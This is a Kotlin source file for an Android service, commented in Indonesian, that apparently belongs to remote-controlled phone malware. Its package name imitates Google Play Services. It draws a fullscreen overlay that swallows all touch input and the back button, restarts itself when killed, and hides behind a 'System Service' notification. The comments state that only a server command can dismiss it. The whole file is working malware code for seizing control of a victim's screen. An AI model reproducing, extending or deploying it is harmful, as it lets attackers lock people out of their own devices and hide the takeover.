package com.android.core.gms

import android.app.*
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.view.*
import android.widget.FrameLayout
import android.widget.TextView
import androidx.core.app.NotificationCompat

// ═══════════════════════════════════════════════════════════════════════════
// PersistentOverlayService
// Fullscreen overlay TYPE_APPLICATION_OVERLAY yang makan semua touch input.
// User tidak bisa menutupnya — hanya bisa dimatikan via perintah server
// (persistentOverlayStop dari DeviceService → stopService()).
// ═══════════════════════════════════════════════════════════════════════════
class PersistentOverlayService : Service() {

    companion object {
        const val EXTRA_MESSAGE = "overlay_message"
        const val EXTRA_COLOR   = "overlay_color"
        private const val CHANNEL_ID = "persistent_overlay_ch"
        private const val NOTIF_ID   = 9901
    }

    private var wm: WindowManager? = null
    private var overlayRoot: View?  = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotifChannel()
        startForeground(NOTIF_ID, buildNotif())
        wm = getSystemService(WINDOW_SERVICE) as WindowManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val msg      = intent?.getStringExtra(EXTRA_MESSAGE) ?: ""
        val colorHex = intent?.getStringExtra(EXTRA_COLOR)   ?: "#000000"
        showOverlay(msg, colorHex)
        return START_STICKY  // respawn jika OS kill service
    }

    // ── Build dan pasang overlay ─────────────────────────────────────────
    private fun showOverlay(message: String, colorHex: String) {
        removeOverlay()

        @Suppress("DEPRECATION")
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            // Tidak pakai FLAG_NOT_TOUCHABLE — overlay aktif consume semua touch
            // FLAG_NOT_FOCUSABLE dihapus supaya hardware back button juga ter-block
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN   or
            WindowManager.LayoutParams.FLAG_FULLSCREEN          or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON      or
            WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS,
            PixelFormat.OPAQUE
        )
        params.gravity    = Gravity.TOP or Gravity.START
        params.systemUiVisibility = (View.SYSTEM_UI_FLAG_FULLSCREEN
            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY)

        // ── Root frame ───────────────────────────────────────────────────
        val frame = FrameLayout(this)
        frame.setBackgroundColor(
            try { Color.parseColor(colorHex) }
            catch (_: Exception) { Color.BLACK }
        )

        // Makan SEMUA touch event — return true = consumed
        frame.setOnTouchListener { _, _ -> true }
        frame.isFocusable          = true
        frame.isFocusableInTouchMode = true

        // ── Teks pesan (jika ada) ────────────────────────────────────────
        if (message.isNotEmpty()) {
            val tv = TextView(this).apply {
                text      = message
                textSize  = 22f
                setTextColor(Color.WHITE)
                gravity   = Gravity.CENTER
                setPadding(56, 56, 56, 56)
            }
            frame.addView(tv, FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT,
                Gravity.CENTER
            ))
        }

        overlayRoot = frame
        try {
            wm?.addView(frame, params)
        } catch (e: Exception) {
        }
    }

    // ── Lepas overlay ────────────────────────────────────────────────────
    private fun removeOverlay() {
        try {
            overlayRoot?.let { wm?.removeViewImmediate(it) }
        } catch (_: Exception) {}
        overlayRoot = null
    }

    override fun onDestroy() {
        removeOverlay()
        super.onDestroy()
    }

    // ── Notifikasi foreground (wajib) ────────────────────────────────────
    private fun createNotifChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                CHANNEL_ID, "System Overlay",
                NotificationManager.IMPORTANCE_LOW
            ).apply { setShowBadge(false) }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
    }

    private fun buildNotif(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Berjalan di latar belakang")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
}
